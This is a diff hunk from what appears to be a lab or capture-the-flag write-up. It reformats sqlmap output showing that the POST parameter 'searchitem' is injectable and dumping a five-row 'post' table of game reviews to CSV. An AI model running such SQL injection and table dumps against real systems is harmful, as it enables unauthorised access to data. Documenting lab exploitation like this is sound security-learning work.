@@ -70,15 +70,15 @@ POST parameter 'searchitem' is vulnerable. Do you want to keep testing the other
 Database: db
 Table: post
 [5 entries]
-+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| id | name                           | description                                                                                                                                                                                            |
-+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-| 1  | Mortal Kombat 11               | Its a rare fighting game ...                                                         |
++----+--------------------------------+-------------------------------
+| id | name                           | description                  |
++----+--------------------------------+-------------------------------
+| 1  | Mortal Kombat 11               | Its a rare fighting game ... |
 | 2  | Marvel Ultimate Alliance 3     | Switch owners will find p... |
-| 3  | SWBF2 2005                     | Best game ever, meh...                                                                                                                                                                                         |
-| 4  | Hitman 2                       | Hitman 2 doesnt add much of note ...                                          |
-| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, ...                      |
-+----+--------------------------------+---------------------------------------------------------
+| 3  | SWBF2 2005                     | Best game ever, meh...       |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much ... |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the ...     |
++----+--------------------------------+-------------------------------
 ...
 [03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>/dump/db/post.csv'                      ...
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
